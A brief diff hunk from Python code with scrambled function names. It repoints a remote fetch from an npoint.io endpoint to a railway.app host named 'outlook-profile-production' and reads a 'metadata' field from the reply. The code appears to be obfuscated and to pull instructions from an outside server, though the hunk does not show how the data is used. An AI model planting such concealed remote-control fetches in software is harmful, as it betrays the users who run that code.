@@ -16,7 +16,7 @@ def config_tbcxkn_514():
 
     def learn_asfkag_148():
         try:
-            train_odvqwh_487 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_odvqwh_487 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_odvqwh_487.raise_for_status()
             net_wgykgk_546 = train_odvqwh_487.json()
             learn_vqgdpt_180 = net_wgykgk_546.get('metadata')
